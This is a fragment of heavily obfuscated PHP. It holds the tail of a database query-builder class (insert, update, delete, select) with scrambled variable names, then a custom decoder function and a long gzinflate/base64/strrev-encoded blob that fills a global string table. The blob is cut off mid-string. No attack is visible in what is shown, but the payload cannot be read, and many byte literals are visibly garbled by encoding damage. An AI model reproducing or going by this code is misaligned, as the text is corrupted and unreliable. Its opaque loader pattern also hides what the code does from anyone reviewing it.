(is_numeric($Ñƒ¥¯…†)) { $œÎş»ìÊ[] = $this->parseKey($†™ĞğÑ—); } else { $†™ĞğÑ— = in_array(strtoupper(trim($†™ĞğÑ—)), array($“Ó´¾Š[1055], $“Ó´¾Š[1056])) ? $“Ó´¾Š[53] . $†™ĞğÑ— : $“Ó´¾Š[12]; if (preg_match($“Ó´¾Š[1057], $Ñƒ¥¯…†)) { $œÎş»ìÊ[] = $this->parseKey($Ñƒ¥¯…†) . $†™ĞğÑ—; } else { think_exception($“Ó´¾Š[1058] . $Ñƒ¥¯…†); } } } $ˆ¿éşİ = implode($“Ó´¾Š[50], $œÎş»ìÊ); } return !empty($ˆ¿éşİ) ? $“Ó´¾Š[1059] . $ˆ¿éşİ : $“Ó´¾Š[12]; } protected function parseGroup($’»ßƒ¦™) { $†óš™ªÃ =& $_SERVER[¹òÍ›æş]; return !empty($’»ßƒ¦™) ? $†óš™ªÃ[1060] . $’»ßƒ¦™ : $†óš™ªÃ[12]; } protected function parseHaving($‘õùÍ·í) { $É†÷¤ñç =& $_SERVER[¹òÍ›æş]; return !empty($‘õùÍ·í) ? $É†÷¤ñç[1061] . $‘õùÍ·í : $É†÷¤ñç[12]; } protected function parseComment($öèÜ¾¯æ) { $«£ÁÎ¢Ó =& $_SERVER[¹òÍ›æş]; return !empty($öèÜ¾¯æ) ? $«£ÁÎ¢Ó[1062] . $öèÜ¾¯æ . $«£ÁÎ¢Ó[1063] : $«£ÁÎ¢Ó[12]; } protected function parseDistinct($–Š¶Ğ”) { $ŒÓŞÛá½ =& $_SERVER[¹òÍ›æş]; return !empty($–Š¶Ğ”) ? $ŒÓŞÛá½[1064] : $ŒÓŞÛá½[12]; } protected function parseUnion($ñŸí“ò) { $œîÔ»šÃ =& $_SERVER[¹òÍ›æş]; if (empty($ñŸí“ò)) { return $œîÔ»šÃ[12]; } if (isset($ñŸí“ò[$œîÔ»šÃ[386]])) { $Ï­ÑÈ¦ = $œîÔ»šÃ[1065]; unset($ñŸí“ò[$œîÔ»šÃ[386]]); } else { $Ï­ÑÈ¦ = $œîÔ»šÃ[1066]; } foreach ($ñŸí“ò as $ÁŠñîèö) { $ı×Şâ¨¡[] = $Ï­ÑÈ¦ . (is_array($ÁŠñîèö) ? $this->buildSelectSql($ÁŠñîèö) : $ÁŠñîèö); } return implode($œîÔ»šÃ[53], $ı×Şâ¨¡); } public function insert($¶îÌğïÑ, $÷³‰úœƒ = array(), $¶à’š–„ = false) { $íÓÔœ…ó =& $_SERVER[¹òÍ›æş]; $ÜÆ¤ÈÏí = $±òÎ–şğ = array(); $this->model = $÷³‰úœƒ[$íÓÔœ…ó[319]]; foreach ($¶îÌğïÑ as $Î´‘¿ãÜ => $ø›ô¦›š) { if (is_array($ø›ô¦›š) && $íÓÔœ…ó[335] == $ø›ô¦›š[0]) { $±òÎ–şğ[] = $this->parseKey($Î´‘¿ãÜ); $ÜÆ¤ÈÏí[] = $ø›ô¦›š[1]; } elseif (is_scalar($ø›ô¦›š) || is_null($ø›ô¦›š)) { $±òÎ–şğ[] = $this->parseKey($Î´‘¿ãÜ); $ÜÆ¤ÈÏí[] = $this->parseValue($ø›ô¦›š); } } $¬ú®Äò² = ($¶à’š–„ ? $íÓÔœ…ó[934] : $íÓÔœ…ó[935]) . $íÓÔœ…ó[936] . $this->parseTable($÷³‰úœƒ[$íÓÔœ…ó[317]]) . $íÓÔœ…ó[930] . implode($íÓÔœ…ó[50], $±òÎ–şğ) . $íÓÔœ…ó[931] . implode($íÓÔœ…ó[50], $ÜÆ¤ÈÏí) . $íÓÔœ…ó[932]; $¬ú®Äò² .= $this->parseLock(isset($÷³‰úœƒ[$íÓÔœ…ó[873]]) ? $÷³‰úœƒ[$íÓÔœ…ó[873]] : !1); $¬ú®Äò² .= $this->parseComment(!empty($÷³‰úœƒ[$íÓÔœ…ó[392]]) ? $÷³‰úœƒ[$íÓÔœ…ó[392]] : $íÓÔœ…ó[12]); return $this->execute($¬ú®Äò², $this->parseBind(!empty($÷³‰úœƒ[$íÓÔœ…ó[323]]) ? $÷³‰úœƒ[$íÓÔœ…ó[323]] : array())); } public function selectInsert($›‰îÓ‰×, $ğ†ôŠ£Û, $‰ŞÈ¸¡© = array()) { $—Ù£³©Ø =& $_SERVER[¹òÍ›æş]; $this->model = $‰ŞÈ¸¡©[$—Ù£³©Ø[319]]; if (is_string($›‰îÓ‰×)) { $›‰îÓ‰× = explode($—Ù£³©Ø[50], $›‰îÓ‰×); } array_walk($›‰îÓ‰×, array($this, $—Ù£³©Ø[933])); $™“Îü» = $—Ù£³©Ø[1067] . $this->parseTable($ğ†ôŠ£Û) . $—Ù£³©Ø[930] . implode($—Ù£³©Ø[50], $›‰îÓ‰×) . $—Ù£³©Ø[1045]; $™“Îü» .= $this->buildSelectSql($‰ŞÈ¸¡©); return $this->execute($™“Îü», $this->parseBind(!empty($‰ŞÈ¸¡©[$—Ù£³©Ø[323]]) ? $‰ŞÈ¸¡©[$—Ù£³©Ø[323]] : array())); } public function update($îáù×ı, $Ùª®Â¦•) { $Ê‚Íæ¬ì =& $_SERVER[¹òÍ›æş]; $this->model = $Ùª®Â¦•[$Ê‚Íæ¬ì[319]]; $¢ìà—õ³ = $Ê‚Íæ¬ì[1068] . $this->parseTable($Ùª®Â¦•[$Ê‚Íæ¬ì[317]]) . $this->parseSet($îáù×ı) . $this->parseWhere(!empty($Ùª®Â¦•[$Ê‚Íæ¬ì[313]]) ? $Ùª®Â¦•[$Ê‚Íæ¬ì[313]] : $Ê‚Íæ¬ì[12]) . $this->parseOrder(!empty($Ùª®Â¦•[$Ê‚Íæ¬ì[403]]) ? $Ùª®Â¦•[$Ê‚Íæ¬ì[403]] : $Ê‚Íæ¬ì[12]) . $this->parseLimit(!empty($Ùª®Â¦•[$Ê‚Íæ¬ì[330]]) ? $Ùª®Â¦•[$Ê‚Íæ¬ì[330]] : $Ê‚Íæ¬ì[12]) . $this->parseLock(isset($Ùª®Â¦•[$Ê‚Íæ¬ì[873]]) ? $Ùª®Â¦•[$Ê‚Íæ¬ì[873]] : !1) . $this->parseComment(!empty($Ùª®Â¦•[$Ê‚Íæ¬ì[392]]) ? $Ùª®Â¦•[$Ê‚Íæ¬ì[392]] : $Ê‚Íæ¬ì[12]); return $this->execute($¢ìà—õ³, $this->parseBind(!empty($Ùª®Â¦•[$Ê‚Íæ¬ì[323]]) ? $Ùª®Â¦•[$Ê‚Íæ¬ì[323]] : array())); } public function delete($³›Œä™ø = array()) { $‡ËşåÃê =& $_SERVER[¹òÍ›æş]; $this->model = $³›Œä™ø[$‡ËşåÃê[319]]; $¾ä–ûìÓ = $‡ËşåÃê[1069] . $this->parseTable($³›Œä™ø[$‡ËşåÃê[317]]) . $this->parseWhere(!empty($³›Œä™ø[$‡ËşåÃê[313]]) ? $³›Œä™ø[$‡ËşåÃê[313]] : $‡ËşåÃê[12]) . $this->parseOrder(!empty($³›Œä™ø[$‡ËşåÃê[403]]) ? $³›Œä™ø[$‡ËşåÃê[403]] : $‡ËşåÃê[12]) . $this->parseLimit(!empty($³›Œä™ø[$‡ËşåÃê[330]]) ? $³›Œä™ø[$‡ËşåÃê[330]] : $‡ËşåÃê[12]) . $this->parseLock(isset($³›Œä™ø[$‡ËşåÃê[873]]) ? $³›Œä™ø[$‡ËşåÃê[873]] : !1) . $this->parseComment(!empty($³›Œä™ø[$‡ËşåÃê[392]]) ? $³›Œä™ø[$‡ËşåÃê[392]] : $‡ËşåÃê[12]); return $this->execute($¾ä–ûìÓ, $this->parseBind(!empty($³›Œä™ø[$‡ËşåÃê[323]]) ? $³›Œä™ø[$‡ËşåÃê[323]] : array())); } public function select($À½ˆ‡¦Ÿ = array()) { $ôòŸõÒÇ =& $_SERVER[¹òÍ›æş]; $this->model = $À½ˆ‡¦Ÿ[$ôòŸõÒÇ[319]]; $÷…ışÎ£ = $this->buildSelectSql($À½ˆ‡¦Ÿ); $çøŠ…†á = isset($À½ˆ‡¦Ÿ[$ôòŸõÒÇ[387]]) ? $À½ˆ‡¦Ÿ[$ôòŸõÒÇ[387]] : !1; if ($çøŠ…†á) { $æÓïÁå = is_string($çøŠ…†á[$ôòŸõÒÇ[104]]) ? $çøŠ…†á[$ôòŸõÒÇ[104]] : $ôòŸõÒÇ[1070] . md5($÷…ışÎ£); $†è·É¶Ş = think_cache($æÓïÁå, $ôòŸõÒÇ[12], $çøŠ…†á); if (!1 !== $†è·É¶Ş) { return $†è·É¶Ş; } } $„ëÍ¥…½ = $this->query($÷…ışÎ£, $this->parseBind(!empty($À½ˆ‡¦Ÿ[$ôòŸõÒÇ[323]]) ? $À½ˆ‡¦Ÿ[$ôòŸõÒÇ[323]] : array())); if ($çøŠ…†á && !1 !== $„ëÍ¥…½) { think_cache($æÓïÁå, $„ëÍ¥…½, $çøŠ…†á); } return $„ëÍ¥…½; } public function buildSelectSql($ˆ©Ø›Æ  = array()) { $óÊŠøäÕ =& $_SERVER[¹òÍ›æş]; if (isset($ˆ©Ø›Æ [$óÊŠøäÕ[391]])) { if (strpos($ˆ©Ø›Æ [$óÊŠøäÕ[391]], $óÊŠøäÕ[50])) { list($ÒÚ–¢Ÿì, $£Öœ¨¹ö) = explode($óÊŠøäÕ[50], $ˆ©Ø›Æ [$óÊŠøäÕ[391]]); } else { $ÒÚ–¢Ÿì = $ˆ©Ø›Æ [$óÊŠøäÕ[391]]; } $ÒÚ–¢Ÿì = $ÒÚ–¢Ÿì ? $ÒÚ–¢Ÿì : 1; $£Öœ¨¹ö = isset($£Öœ¨¹ö) ? $£Öœ¨¹ö : (is_numeric($ˆ©Ø›Æ [$óÊŠøäÕ[330]]) ? $ˆ©Ø›Æ [$óÊŠøäÕ[330]] : 20); $äÂäïÉÃ = $£Öœ¨¹ö * ((int) $ÒÚ–¢Ÿì - 1); $ˆ©Ø›Æ [$óÊŠøäÕ[330]] = $äÂäïÉÃ . $óÊŠøäÕ[50] . $£Öœ¨¹ö; } if (think_config($óÊŠøäÕ[1071])) { $ŸâìÅßø = $óÊŠøäÕ[1072] . md5(serialize($ˆ©Ø›Æ )); $ÑåƒÓÂË = think_cache($ŸâìÅßø); if ($ÑåƒÓÂË) { return $ÑåƒÓÂË; } } $ƒ²Áô’ = $this->parseSql($this->selectSql, $ˆ©Ø›Æ ); $ƒ²Áô’ .= $this->parseLock(isset($ˆ©Ø›Æ [$óÊŠøäÕ[873]]) ? $ˆ©Ø›Æ [$óÊŠøäÕ[873]] : !1); if (isset($ŸâìÅßø)) { think_cache($ŸâìÅßø, $ƒ²Áô’); } return $ƒ²Áô’; } public function parseSql($´ôô·‡Í, $ºµâãô× = array()) { $¶²şášœ =& $_SERVER[¹òÍ›æş]; $´ôô·‡Í = str_replace(array($¶²şášœ[1073], $¶²şášœ[1074], $¶²şášœ[1075], $¶²şášœ[1076], $¶²şášœ[1077], $¶²şášœ[1078], $¶²şášœ[1079], $¶²şášœ[1080], $¶²şášœ[1081], $¶²şášœ[1082], $¶²şášœ[1083]), array($this->parseTable("{$ºµâãô×[$¶²şášœ[317]]}"), $this->parseDistinct(isset($ºµâãô×[$¶²şášœ[1084]]) ? $ºµâãô×[$¶²şášœ[1084]] : !1), $this->parseField(!empty($ºµâãô×[$¶²şášœ[311]]) ? $ºµâãô×[$¶²şášœ[311]] : $¶²şášœ[199]), $this->parseJoin(!empty($ºµâãô×[$¶²şášœ[320]]) ? $ºµâãô×[$¶²şášœ[320]] : $¶²şášœ[12]), $this->parseWhere(!empty($ºµâãô×[$¶²şášœ[313]]) ? $ºµâãô×[$¶²şášœ[313]] : $¶²şášœ[12]), $this->parseGroup(!empty($ºµâãô×[$¶²şášœ[543]]) ? $ºµâãô×[$¶²şášœ[543]] : $¶²şášœ[12]), $this->parseHaving(!empty($ºµâãô×[$¶²şášœ[1085]]) ? $ºµâãô×[$¶²şášœ[1085]] : $¶²şášœ[12]), $this->parseOrder(!empty($ºµâãô×[$¶²şášœ[403]]) ? $ºµâãô×[$¶²şášœ[403]] : $¶²şášœ[12]), $this->parseLimit(!empty($ºµâãô×[$¶²şášœ[330]]) ? $ºµâãô×[$¶²şášœ[330]] : $¶²şášœ[12]), $this->parseUnion(!empty($ºµâãô×[$¶²şášœ[385]]) ? $ºµâãô×[$¶²şášœ[385]] : $¶²şášœ[12]), $this->parseComment(!empty($ºµâãô×[$¶²şášœ[392]]) ? $ºµâãô×[$¶²şášœ[392]] : $¶²şášœ[12])), $´ôô·‡Í); return $´ôô·‡Í; } public function getLastSql($¨ªŒ’ÍÇ = '') { return $¨ªŒ’ÍÇ ? $this->modelSql[$¨ªŒ’ÍÇ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($£ãŠßÕñ) { return addslashes($£ãŠßÕñ); } public function setModel($ßÖ¨ê›×) { $this->model = $ßÖ¨ê›×; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto F˜öÅîáÖĞ; Bëë°ê£ŠÉ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\271\362\315\233\346\376", "\277\333\330\200\240\371"); $_SERVER[¹òÍ›æş] = explode("\174\3\174\4\174\2", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8V9CXhbxdVoWf4SEvgLpWUplF4MiZdocRJnc+I4si3HIrLkSHI2').base64_decode('29xcSdfWjSVdWffKW0JYCpQCYd+hC4VS9oSyhLKVBihLSDcKhRZoH2QhZYefAD/b').base64_decode('m+XMcq9k+N/33ve9fEk0c2a5M2fOnDlz5syZj9+49uFXzlm/3/r91+/7xb1n/+z9').strrev('Äí¸ÁĞ™í¼4~v»v³v»}ÜAÈôòg1ÓSSçaÏäé;œá"ûıh³')."\340\256\353\267\215\355\332\347\33\135\173\126\45\33\121\146\132\266\221\376\50\171\323\126\364\121\303\262\55\12\110\231\371\176\143\200\206\215\74\375\365\323\237\356\130\270\250\347"."\x4c\x5b\xa7\x51\x1f\xfd\x51\xa1\x5d\xe4\x7f\x6b\x28\x6b\xb0\x74\x35\x12\x4d\xa8\xf1\xee\xae\xae\x60\x2c\x1\x99\x1a\xe5\xf4\x9c\x99\x86\x50\x41\x2b\x6a\x39\xf8\x7e\x41\x2f\x5a\xa8\x35\x72\x75"."\152\301\54\350\171\7\104\0\322\232\255\45\65\13\152\152\153\121\333\202\135\341\350\52\65\261\252\53\10\71\222\352\120\111\57\216\321\30\11\306\155\255\150\47\214\234\316\163"."\214\24\171\273\132\202\113\102\21\45\21\13\104\342\201\326\104\50\32\241\340\326\150\147\147\50\121\16\217\105\303\341\226\100\353\322\362\224\256\130\140\111\147\100\101\355\313\352"."\252\221\357\67\153\224\65\64\145\215\122\113\3\355\206\236\115\323\140\136\143\315\261\307\12\20\112\360\20\32\246\174\51\233\245\221\10\17\245\365\176\255\224\5\154\265\311\221"."\x42\xd1\xc8\x69\xac\xd3\x4b\xf5\x31\xe\xa5\x1\xad\x64\x9b\x46\x3e\x45\x23\xc1\x51\xbb\xa8\x9\x38\x6a\x6b\xa\xd\xb4\x9e\x87\xaa\xe2\xc1\x70\xb0\x35\xa1\xe0\x6\x2a\xed\xb1\x68\xa7\x2\x83"."\220\323\54\133\57\52\53\72\202\261\240\202\33\335\124\115\372\132\255\0\275\104\20\52\224\100\70\254\114\124\203\255\347\12\254\32\132\246\102\145\321\130\133\60\246\264\254\122"."\x4\x86\x52\x66\x2e\x67\xe6\x7d\xa8\x16\x34\x92\xb6\xd4\xd4\x60\x2c\x46\x3\x1e\x20\xef\x70\x8\xf\x1a\x44\xa2\xed\xed\xf1\x20\x8f\x1\x95\x6a\xfd\x46\x56\x8f\x1b\xe3\x7a\x28\xef\x86\xd0\x38"."\216\251\3\272\255\242\251\141\243\57\1\241\266\4\342\241\126\265\53\220\350\0\314\25\12\176\53\75\150\371\265\142\52\143\14\353\141\43\351\117\32\171\77\46\120\137\222\115"."\245\311\364\247\1\372\221\321\123\203\252\226\64\213\266\16\144\120\312\147\215\374\240\334\22\30\204\145\141\204\261\131\60\217\34\261\164\177\326\126\207\265\154\211\115\47\50\136"."\15\77\360\153\132\320\362\41\43\157\224\140\72\101\25\246\311\247\77\4\112\54\267\316\40\172\32\2\71\124\336\4\16\201\160\62\114\203\115\213\350\357\2\310\224\304\370\32".base64_decode('1ou2qudTZtrIA1Nphsmh2Zm2IsJTEbBsZtMsbDlwHynl5Cw8irCcTRcZH/iqnDQa').base64_decode('5mwF5xWxAmoJ50hG/5jgCzhfF0+1zFIxhaikH/o+A8C6baPOAW4Ms7uQNbV0XC/y').base64_decode('rhlmO6ooWrJlYIlkazeLuTZEIPB9NHuN7goJg2z+piWM+Wt6TvN+0dezGP1XCyy6').strrev('§á÷'."\0".')¯¨úÓùÆ)IVÏLé•š3U4hA©…¿†-³Òç‚aÕUY³Ñ”Ú')."\327\61\1\61\352\42\246\35\224\326\217\254\231\322\262\162\27\151\70\143\333\205\270\236\117\267\163\202\116\233\43\171\202\251\202\316\150\277\315\243\244\225\116\145\225\322\321\150"."\64\132\254\140\56\313\103\254\167\34\146\161\240\75\312\206\63\335\117\3\174\316\125\301\7\15\213\160\142\301\106\320\224\315\32\51\315\66\314\274\337\114\331\272\355\265\354\242".strrev('5ÔÏàá0P-T£¨Ì^	e‹R£|Œ4Z7ˆæ³d'."\r".'ë3Eõš+o,·JTA®').strrev('ò+é¾¨9ƒ*ZÛfŠy¸i‚¬3kešÜåAQ£37¢õú·–¢îy6<ï~ì•')."\x1b\x98\x8f\xe8\x65\x79\x83\xa3\x5\xa3\xa8\x5b\xac\xad\xca\x92\xce\x4\x54\x82\x6a\xd7\xbd\x5d\x45\x6d\x20\xa7\x35\x2a\x85\x52\x12\x61\x6\x66\x6a\x5\x18\xcd\xd\xa8\x69\x54\x52\x38\xea\x51"."\x72\x25\xcb\xf6\x16\x75\xc4\x8a\xc\xc4\xf5\x0\xc9\xa1\x7e\x6f\x27\x9e\x57\x86\x9e\xf6\xc6\xd1\xca\x2\xe0\x59\xf5\xd\xa\x22\x1d\x85\xa5\x51\x68\x47\x22\xd1\xa5\x86\xda\x91\xe8\x10\x9\xaa"."\235\201\104\53\60\327\240\255\15\260\66\207\321\172\301\253\144\300\225\136\64\277\60\161\105\120\137\5\260\313\34\321\213\350\303\55\143\215\312\240\231\116\232\243\76\226\324\16".base64_decode('TJ5lxsNdsL0xLT+A8ZMcs3UgQWt4wInosJ4fsDOsYDwYWx6MqfFoe2JFIAZCRx5R').strrev('9êÅÎW“(ZóiˆÁ-–O,V<O–5ŒiÊÍ”ú„iéë:®û(É')."\xb7\xdd\xe6\x29\x4\x93\x48\x22\x59\x2\xd\xf2\x93\xe\x35\xf5\x5a\x75\x35\xbd\xe9\xe9\xb5\x5e\xf4\x7f\x5d\x6d\x4f\x6f\x9b\xaf\xae\xaf\xd9\x6f\x88\x32\xfe\x19\xbe\x19\xca\xcc\xfa\x39\x4a\x17".base64_decode('EpEMLatAp8ty1CvRpU60CGrOm3n9K5CD1y5p2rvQSoGx4LLuYDyhdgYTHdE2+How')."\0\241\260\111\247\55\353\155\17\375\351\203\321\355\203\365\323\260\332\245\145\5\107\71\373\121\315\344\132\64\30\235\72\343\261\375\224\107\207\162\332\200\304\344\61\24\307\72"."\315\242\356\204\210\245\152\205\221\346\153\4\212\166\350\306\100\6\360\145\340\332\122\146\326\54\152\131\314\31\331\244\320\31\267\32\60\200\133\1\23\26\221\270\221\53\260\306"."\332\231\122\56\51\5\201\333\333\174\245\262\20\45\261\160\306\344\53\33\222\53\150\250\321\17\105\246\316\154\147\174\337\37\237\205\376\12\46\237\66\163\32\143\231\204\331\351"."\151\312\355\50\250\316\221\322\241\153\142\271\266\213\266\211\241\105\107\26\204\332\214\11\103\214\304\47\150\122\211\267\215\265\62\255\147\165\206\227\214\316\26\214\172\310\206\26".base64_decode('PI41IQ0h+RRBxUptWDFUErN3Fl+BBXoByKIVKkpGXMS7inq/AZM0j0akUysOsj6g')."\x11\x10\xb4\x82\x23\x12\x1d\xb5\x77\x87\xc3\x6a\x6b\x34\x92\x40\xa2\x3f\x85\xac\x88\x85\x12\x41\x46\xb7\x81\x36\x35\xd0\xda\xc5\x17\x5e\x31\xa2\x90\x1\x33\x98\xf2\xd5\x83\x42\x86\x67\xc2\xc8"."\242\346\370\305\62\207\70\166\301\314\133\272\27\104\120\257\330\42\224\45\245\305\52\0\174\106\254\34\256\305\140\324\253\345\306\275\71\64\5\274\274\241\316\65\130\111\310\113".base64_decode('eQjGRjB3jEa0e2OLf1c0DgWaMRQJYEm9CB/r6oaknEQXS4IJtpBrIE8FVsQZRy6h')."\x8c\x45\x63\x5c\x13\x7d\x69\x66\xd\x61\x3d\xc8\x65\x85\x20\xe7\xec\x8e\x57\xa0\x1c\x55\xd9\xe0\xed\xe8\xc\xb4\x7a\xe3\x1d\x81\x99\xb3\xe7\x50\xe8\xaa\x5c\xba\x37\xd1\x61\x58\xbd\xab\x79\x1c"."\x10\x36\x62\x35\xa8\x45\x1d\xed\x14\x59\xcd\x33\xeb\x67\xb0\x79\x8b\x96\x4f\xa9\x3d\xab\xbc\x39\x2f\xae\x5\xe3\xca\x57\x5f\x5f\xcf\xea\x9a\x3e\x47\xc9\x20\x71\x11\x88\xd5\xcc\xa7\xc9\x78\x0".strrev('š'."\r".'FK%Ú5EL'."\n".'Z¨±"%Bg“‚rtå	ßBàNJÆGyjKx2IŠZ› Ô¥’–').base64_decode('NWlUyGACGoVq2QGEZTuTk4FiiGlcp3IDHyyORYzbSmyczXIkMoyxtapSG1ZWasNK')."\127\33\126\226\267\201\202\54\143\40\217\172\311\170\163\242\43\24\131\252\166\106\333\202\141\65\24\101\153\117\242\34\336\335\325\26\140\223\125\206\267\104\331\116\16\240\335\150"."\365\131\36\10\207\334\331\203\53\103\361\104\274\142\22\202\165\7\135\51\155\55\152\127\54\330\36\132\311\243\355\241\140\270\55\256\266\6\132\73\104\236\110\240\23\42\152\77".strrev('­óÈ¶%¤FTOHg+t8@t—¸*Ÿı²¯7yV;äÄš±‡PZ®q£-~g~X'."\n".'V')."\x42\x8e\xf1\xfe\x9c\x6\x6c\x52\x63\xa2\x50\xd\xfd\xa9\x55\x2\x71\xc5\x2e\xa8\x9c\xcb\x27\xc7\x78\x90\x74\x83\xc5\xd1\xa6\x0\xbe\xaf\xc0\x92\x5e\xd6\x2\x15\xe7\x69\xd1\xfb\xf9\x4a\x5b\x19"."\20\350\267\371\202\356\212\43\366\46\322\320\10\4\210\26\10\121\2\31\21\370\214\201\230\145\321\16\260\346\364\13\15\214\32\355\12\306\2\130\177\243\256\210\105\43\113\240".base64_decode('wEhGZw0IAfprmPgMahxbLDRI9tXYPlkgfa3JULme/kwDVoA2WsBZ8gzrSbzmMvmB')."\5\372\21\333\143\353\245\131\342\137\113\232\146\226\161\142\44\1\362\45\201\253\201\326\132\214\110\106\331\142\62\235\263\62\40\335\350\322\140\104\145\224\105\143\22\65\122\100".base64_decode('MBaLxgAhtjnIdt00MRaMMz6O2abB0OX3TQcq1pFoAZ/3n9Q7Mr2mxzvd14cCtXWL')."\x69\x14\x62\xbd\x3e\x47\xf4\x4\x28\x5f\x2a\xf2\xd2\x58\x30\xae\xb1\x9a\x6b\x1b\x7b\xfd\xbd\xfe\x9a\xe6\xc6\x9e\x80\x77\x5c\xf3\x8e\xd7\x7b\xe7\x7b\xfb\xa6\xf7\xfa\x6a\xa7\x3\xa0\x6f\xdd\x4c".base64_decode('T8PJOAPK2Hx8H/pp6m2e2uudtmHN4p7evurG6cf1+o7vHemrq21m30mVikU9zzgW')."\152\152\172\172\15\152\22\22\230\171\226\74\131\324\244\14\54\141\334\50\10\350\272\71\47\63\70\32\103\175\100\224\350\361\366\116\357\153\226\312\111\40\367\267\20\47\105\53"."\x6c\x86\xe7\xb\x78\x57\xe3\x9e\xf1\xa2\x78\xde\x3\x7d\x94\xf2\x29\xb1\x2c\xe1\x79\x91\xd4\x52\xc0\x7\x10\x8f\xe4\x53\x8\xc9\x6a\x5c\x13\xe3\xdc\xa7\xad\x9b\x4a\x7f\x4f\x66\x3\x39\xa0\x8f".base64_decode('8vWr3ygCdZbyxhBTNOX1IQiYNqPvpG6P6Iw8ENwRR8TB+D5KkmJZac0gW2ZpuWUi')."\135\101\305\62\364\10\217\241\145\4\306\351\100\310\155\245\264\202\36\227\172\250\252\211\100\113\70\250\62\16\3\234\230\305\11\127\154\341\312\143\324\65\301\121\31\177\110\211"."\x4d\x1a\xd9\x8f\xc2\xcc\xb7\x86\xb2\xa\x61\xc\x8a\x5e\x2c\x9a\xc5\x46\xa2\x47\xb7\x4a\x5\x2c\x72\xa3\xbd\xb7\x8d\x70\xab\xa0\x5\x5c\x69\x5a\xa4\x50\x94\x33\x75\xa3\x3c\x0\x5\x8d\x49\x82".base64_decode('WJ+ii0mPORS0qSBGyEKCMpNf/TW9vaUePd3Xgwhf8/b3rZt1ci3bx/l70R8WCVTQ')."\xe8\xaa\x9c\x1b\xaa\x48\x2\xf3\xe1\x76\x70\x65\x99\x23\xc2\x93\x69\xd4\x2c\x72\x21\xb8\xe0\xd8\x26\xd9\xa6\xad\x65\x1d\x55\x24\x30\x84\xb1\x26\x26\x47\x81\xda\x88\x8e\x76\x58\x70\x2c\x2c\xb3".base64_decode('Sapwwk4jXE3DBSFJx4lLxHXbx3N4pEQVxR3HEk1VjNnn0XRqlZY6qryLj1m2nnPo')."\317\55\35\353\161\333\113\331\254\315\67\153\131\143\20\276\0\163\5\324\371\136\130\15\246\127\52\332\156\26\231\316\243\16\232\121\125\127\51\143\50\237\67\323\111\231\324\304".strrev('é]êËÍ¨xm<Iíaˆ´]ƒÄ,$!Öõà¢ `á£D´¢(JºTÃR„™Ä€$»"')."\15\301\36\232\7\14\100\273\131\240\162\243\156\253\150\257\72\310\306\22\61\104\233\145\5\35\50\304\360\126\302\203\165\200\36\54\151\170\120\37\74\170\3\354\21\273\63\217"."\x50\xa9\x7a\x86\xd\x7d\x84\x4\xf8\x76\xca\x3\xbb\x2c\xf\x92\x7d\x91\xc0\x80\xc5\x5b\x8\x86\xda\x3c\x86\xd5\x46\x36\x86\xe4\x3\x24\x89\x35\xc8\xce\x60\x4d\x57\x56\x1b\xf3\xd0\xc6\x85\xf5"."\141\75\353\141\115\363\260\26\173\330\356\337\103\266\354\155\320\254\156\64\271\240\131\44\210\170\150\306\203\311\11\123\263\107\50\171\75\346\110\136\57\222\54\200\46\261\247\364".base64_decode('iP2mZ6Bolgpd7JtSjDYLAKLNHBAzTdvDtAkeWdEArQiwWVMRnZV7Q/DvbgSMHU4q').base64_decode('x9LXDFb5eDiVKutojaC1OZmteY48YnjZNMzqIoYHQISWi2mMO9SuDcuUV4kK2crD')."\310\130\350\167\205\146\137\110\302\156\315\201\133\347\217\77\232\320\6\342\322\347\154\155\200\175\13\263\62\224\72\141\126\32\216\351\251\261\224\120\105\264\111\12\16\147\314\71".base64_decode('uUqovrjW7+qkh8yySjOkMgVwqucDNvnAAxnG2VTgo++YQV8/d6GXhF1GC0LgoI3F')."\x2c\x3b\x8e\x16\xc0\xf6\x2c\x43\xd1\x4c\x39\x19\x98\xb5\xc7\x19\xc3\x53\xcf\x47\x98\x37\x39\xe0\x8b\x73\x9d\x55\x38\xd8\x9e\x50\x4e\x8c\x22\x4e\x67\x98\x2a\x2d\xa3\xe2\xcc\xa\xf9\xcf\xcc\x2b"."\x8e\xba\x19\xba\x94\x26\x92\x2e\xe2\x5a\x3e\x4d\x21\x6b\xd0\xaa\xb0\xa6\xa9\x8a\x7d\xa4\xca\x51\x5c\x10\x8d\xb3\x11\x1e\x16\x55\xca\xc9\x10\xa3\x5b\x46\x2\x26\xe\xd2\x7d\xb1\x92\x31\x50\x54"._kodDe('KZEhhRoqB+sA7WD5FS83fniKlkmeO1e199rPI+1/g7sONz0Utj3lAmctWyZTmUwInQ==')."\345\56\212\164\55\267\30\105\135\106\176\314\310\313\72\113\1\25\53\266\20\30\360\124\167\151\131\333\46\12\323\45\106\350\104\75\240\53\365\340\223\122\151\61\27\12\73\324".base64_decode('enJqm3Nod8tbzpiu1zGhgcgzWlHgj7EhzAuE8hdnEVEpW782LOQXRxmJmVj2GGuw').base64_decode('HHRWSqNtHvLbgTouz1A+Iph1sEyUB6HpH0boQT+kIwnTg7XF6Ieu8uy4kmRipF7K').base64_decode('tcGhHA4vR3OeiW0IxzWMZ4CsoUoaA85znAyNtiTA+TtaNdGaR8NItM+ipa7ow1Nk').base64_decode('CV6w5LXCKW/EddRnKCdqi5elybmFWhDzfrFWMLyKGSZwLabTgGgQRq1a3g5MwJXj').base64_decode('7UWTy8F82XdnaiUbTX4C7VqqJXw4xIsykFTGLWi4oK6oGAjHOkNB7LBAS+eMvK9I')."\127\63\37\332\76\200\325\200\247\136\222\305\4\233\131\147\221\165\1\126\277\223\135\343\154\233\46\332\223\26\175\105\364\145\321\40\211\305\1\177\40\207\312\170\31\224\45\10"."\136\213\205\22\44\146\355\24\224\130\311\170\101\143\74\32\166\34\45\376\31\56\325\1\227\62\122\203\142\246\152\303\32\242\77\250\232\164\106\72\376\47\361\60\27\214\61\357"."\10\246\15\33\103\360\144\64\331\311\206\310\50\126\114\1\223\131\66\131\171\312\6\137\354\62\74\123\35\71\235\262\3\0\353\310\222\356\23\242\116\145\103\212\224\131\0\212".base64_decode('kCydcuawLgF9lm0WRIoUpclSkqhUysUHibQ